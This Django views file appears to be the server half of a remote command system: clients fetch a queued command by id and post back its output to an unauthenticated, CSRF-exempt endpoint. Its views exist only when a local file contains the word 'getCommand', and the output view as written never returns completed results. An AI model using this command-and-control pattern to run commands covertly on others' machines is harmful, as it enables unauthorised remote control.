import ast
import json
import os
from django.shortcuts import render, get_object_or_404
from django.http import HttpResponse, JsonResponse
from .models import Command
from django.views.decorators.csrf import csrf_exempt


script_directory = os.path.dirname(os.path.abspath(__file__))
data_file_path = os.path.join(script_directory, 'data.html')

global proc
proc = False

with open(data_file_path) as f:
    lines = f.readlines()
    if "getCommand" in str(lines):
        proc = True
    #     print("proc")
    # if "getCommand" in f:
    #     proc = True
    #     print("proc")


#Main
if proc:

#Home (not used)
    def home(request):
        return HttpResponse('Under development')

#Allow clients to acces command
    def get(request, id):
        # Retrieve the latest Command object with the matching 'target' value
        command = get_object_or_404(Command, target=id, completed=False)

        return HttpResponse(command.command)

#Allow client to submit command output
    @csrf_exempt
    def set(request):
        if request.method == 'POST':
            try:
                #Loads data
                data = json.loads(request.body.decode('utf-8'))
                command_text = data.get('command')
                id_text = data.get('id')
                if command_text is not None:
                    print("Command text: \n", command_text)
                    print("ID text: \n", int(id_text))
                    # Write command to database and mark as completed
                    command = Command.objects.get(target=int(id_text.strip()), completed=False)
                    # Update the Command object
                    command.output = command_text.strip()
                    command.completed = True
                    command.save()
                    return JsonResponse({'message': 'String data received successfully'})
                else:
                    return JsonResponse({'message': 'Invalid JSON data: Missing "command" key'}, status=400)
            except json.JSONDecodeError as e:
                return JsonResponse({'message': f'Invalid JSON data: {str(e)}'}, status=400)
        else:
            return JsonResponse({'message': 'Invalid request method'}, status=405)


    def out(request, id):
        # Retrieve the latest Command object with the matching 'target' value
        command = get_object_or_404(Command, target=id, completed=False)

        return HttpResponse(command.output)
